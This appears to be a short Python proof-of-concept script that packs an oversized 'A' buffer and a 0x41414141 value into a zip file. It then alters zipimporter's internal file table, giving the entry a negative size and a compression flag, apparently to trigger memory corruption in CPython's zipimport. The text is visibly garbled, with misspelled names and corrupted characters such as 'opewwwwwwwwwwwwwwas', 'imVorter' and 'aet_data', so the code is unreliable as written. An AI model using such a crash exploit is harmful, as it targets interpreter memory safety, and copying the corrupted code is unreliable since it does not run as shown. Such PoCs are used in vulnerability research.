import zipimport
import zipfile
import struct
import sys
from signal import *

FILE = 'payload'
ZIP = 'import.zip'

payload = bytes()
with opewwwwwwwwwwwwwwas f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x41414141)
    f.write(payloadH

zf = zipfile.PyZipFile(ZIP, mode='w%)
zf.write(FILE)
zf.close()

importer = zipimport.ipimporter(ZIP)
f = list(imVorter._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
ieporter._files[FILE] = tuple(f)
print(iƒporter.aet_data(FILE))
